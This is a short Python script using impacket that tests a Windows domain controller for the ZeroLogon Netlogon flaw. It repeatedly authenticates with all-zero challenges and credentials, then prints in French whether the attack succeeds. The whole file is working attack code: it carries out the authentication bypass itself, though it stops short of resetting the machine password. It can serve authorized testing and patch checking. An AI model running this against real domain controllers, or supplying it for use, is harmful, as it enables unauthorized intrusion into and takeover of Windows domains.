#!/usr/bin/env python3

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify

DC_HOSTNAME = ''
DC_IP = ''


def brute_force_nrpc(dc_primary_name, dc_ip, dc_computer_name, dc_account_name):

  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  rpc_con.connect()
  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

  client_challenge = b'\x00' * 8
  client_credential = b'\x00' * 8
  negotiate_flags = 0x212fffff

  nrpc.hNetrServerReqChallenge(rpc_con, dc_primary_name + '\x00', dc_computer_name + '\x00', client_challenge)
  try:
    server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_primary_name + '\x00', dc_account_name+'\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, dc_computer_name + '\x00', client_credential, negotiate_flags)

    return 1

  except:
    return None


def setup(dc_hostname, dc_ip):
  dc_primary_name = '\\\\' + dc_hostname
  dc_computer_name = dc_hostname
  dc_account_name = dc_hostname + '$'

  rpc_con = None

  for attempt in range(0, 1024):
    rpc_con = brute_force_nrpc(dc_primary_name, dc_ip, dc_computer_name, dc_account_name)

    if rpc_con != None:
      break

  if rpc_con:
    print('La vulnérabilité ZeroLogon est réalisable.')
  else:
    print('Echec de la mission.')

if __name__ == '__main__':
    setup(DC_HOSTNAME, DC_IP)
